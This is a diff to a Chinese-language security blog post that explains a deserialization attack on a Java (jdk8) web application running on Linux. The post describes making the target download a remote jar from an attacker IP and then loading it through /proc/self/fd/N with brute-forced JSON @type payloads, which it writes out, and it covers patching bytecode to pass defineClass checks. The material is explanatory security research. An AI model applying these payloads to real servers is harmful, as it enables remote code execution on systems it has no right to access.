@@ -22,6 +22,7 @@ draft: false
 - java版本：jdk8
 - 目标必须出网
 - 类加载器支持加载URL资源
+- 系统为Linux
 
 # 演示环境
 
@@ -92,11 +93,11 @@ defaultClassLoader是ParserConfig单例的一个属性，如果没有人为去�
         } catch (Throwable e) {
 ```
 
-而在Linux上，存在绕过这个限制的方法。首先发送 `{"@type":"jar:http:..<十进制IP>:<端口>.probe!.POC","x":1}`。探测阶段的 `getResourceAsStream` 走的是资源侧，走的是LaunchedURLClassLoader类加载器，目标会把远程 jar 拉下来，并被自己的类加载器缓存成一个本地临时文件——这个文件已被标记"删除"，但**文件描述符还开着**，挂在 `/proc/self/fd/N` 上（N 是操作系统分配的编号，事先不知道因此需要爆破）。随后我们发送`{"@type":"jar:file:.proc.self.fd.N!.POC","x":1}`，使用file协议绕过这个限制。它没有 `jar:http://` 那种 `//`，能通过TomcatEmbeddedWebappClassLoader的检测。而这个payload依旧是不完整的，无法生效。
+而在Linux上，存在绕过这个限制的方法。首先发送 `{"@type":"jar:http:..<十进制IP>:<端口>.probe!.POC","x":1}`。探测阶段的 `getResourceAsStream` 走的是资源侧，走的是LaunchedURLClassLoader类加载器，会把远程 jar 拉下来，并被自己的类加载器缓存成一个本地临时文件在/tmp目录下，这个文件已被标记删除，但**文件描述符还开着**，挂在 `/proc/self/fd/N` 上（N 是操作系统分配的编号，事先不知道因此需要爆破）。随后我们发送`{"@type":"jar:file:.proc.self.fd.N!.POC","x":1}`，使用file协议绕过这个限制。它没有 `jar:http://` 那种 `//`，能通过TomcatEmbeddedWebappClassLoader的检测。而这个payload依旧是不完整的，无法生效。
 
-因为新的问题又诞生了。最后的类加载会落到ClassLoader.defineClass(String name, byte[] b, int off, int len, ProtectionDomain protectionDomain)方法中来把类加载到jvm，其中String name是类名、是直接透传过来的`jar:file:/proc/self/fd/231!/POC231`，byte[] b则是类的字节码数据。defineClass把`String name`和`字节码常量池里的 this_class`作比较，如果是相等则加载类，否则抛出异常。
+因为新的问题又诞生了。最后的类加载会落到ClassLoader.defineClass(String name, byte[] b, int off, int len, ProtectionDomain protectionDomain)方法中来把类加载到jvm，其中String name是类名、是直接透传过来的`jar:file:/proc/self/fd/N!/POC`，byte[] b则是类的字节码数据。defineClass会把`String name`和`字节码常量池里的 this_class`作比较，如果是相等则加载类，否则抛出异常。
 
-为此我们只需要在编译好字节码后，手动去更改字节码常量池里的 this_class就好了。不过由于N的值不确定，修改的值也不确定，所以我们需要把很多的class文件放到同一个jar包里，JAR 格式规定:**条目名(entry name)是容器的唯一键**——同一个 jar 里不可能存在两个都叫 `POC.class`、内容却不同的条目。要么同名去重,要么换名共存。，为此我们可以统一命名成**`jar:file:.proc.self.fd.N!.POCN`**。并且将这些class文件全部打包在一个jar包里。如图下所示。
+为此我们只需要在编译好字节码后，手动去更改字节码常量池里的 this_class就好了。不过由于N的值不确定，修改的值也不确定，所以我们需要把很多的class文件放到同一个jar包里，JAR 格式规定:**条目名(entry name)是容器的唯一键**——同一个 jar 里不可能存在两个都叫 `POC.class`、内容却不同的条目。要么同名去重,要么换名共存。所以我们可以统一命名成**`jar:file:.proc.self.fd.N!.POCN`**。并且将这些class文件全部打包在一个jar包里。如图下所示。
 
 ![image-20260826020243757](2.png)
 
